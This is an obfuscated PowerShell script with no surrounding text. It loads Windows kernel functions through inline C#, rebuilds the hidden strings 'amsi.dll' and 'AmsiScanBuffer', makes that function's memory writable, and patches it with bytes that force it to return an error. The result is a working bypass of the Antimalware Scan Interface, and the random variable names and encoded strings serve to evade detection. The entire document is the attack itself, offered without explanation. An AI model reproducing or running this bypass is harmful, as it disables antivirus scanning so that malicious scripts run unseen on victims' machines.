$lQNXm70OFwVNvambNa = @"
using System;
using System.Runtime.InteropServices;
public class lQNXm70OFwVNvambNa {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr Nqy, string tNgXeTB);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr IaHJIEJQ_Cju42zE, UIntPtr T1IW5KtwIN, uint xD6t0, out uint K7ad9wWPXqK3);
}
"@

Add-Type $lQNXm70OFwVNvambNa

$lNFwN2hlPEgXjNiTdt = [lQNXm70OFwVNvambNa]::LoadLibrary("$([cHar](97*44/44)+[ChaR]([bYtE]0x6d)+[chAR](115*3/3)+[cHAR]([BytE]0x69)+[CHar](24+22)+[cHaR](100*47/47)+[chAR]([BytE]0x6c)+[char](54+54))")
$b9w8uLKjwjsXMf6kdvb = [lQNXm70OFwVNvambNa]::GetProcAddress($lNFwN2hlPEgXjNiTdt, "$(('ÃmsíScänBùff'+'èr').noRMalizE([cHAr](21+49)+[cHAR]([ByTE]0x6f)+[Char]([bytE]0x72)+[chAr]([bYTE]0x6d)+[CHar]([bYTe]0x44)) -replace [ChAR]([Byte]0x5c)+[CHaR]([byte]0x70)+[ChaR]([ByTe]0x7b)+[char]([ByTe]0x4d)+[CHar]([bYTe]0x6e)+[CHAR](125*52/52))")
$p = 0
[lQNXm70OFwVNvambNa]::VirtualProtect($b9w8uLKjwjsXMf6kdvb, [uint32]5, 0x40, [ref]$p)
$Oyu8NCNT9aNVGn_9Iw = "0xB8"
$m9KZpU7jDRAhvyptb = "0x57"
$qT0Iw_Qs9Z = "0x00"
$rLoqu8syRuFd4wIF = "0x07"
$djOJVz = "0x80"
$vsL4A = "0xC3"
$tB4D6xW2Ed = [Byte[]] ($Oyu8NCNT9aNVGn_9Iw,$m9KZpU7jDRAhvyptb,$qT0Iw_Qs9Z,$rLoqu8syRuFd4wIF,+$djOJVz,+$vsL4A)
[System.Runtime.InteropServices.Marshal]::Copy($tB4D6xW2Ed, 0, $b9w8uLKjwjsXMf6kdvb, 6)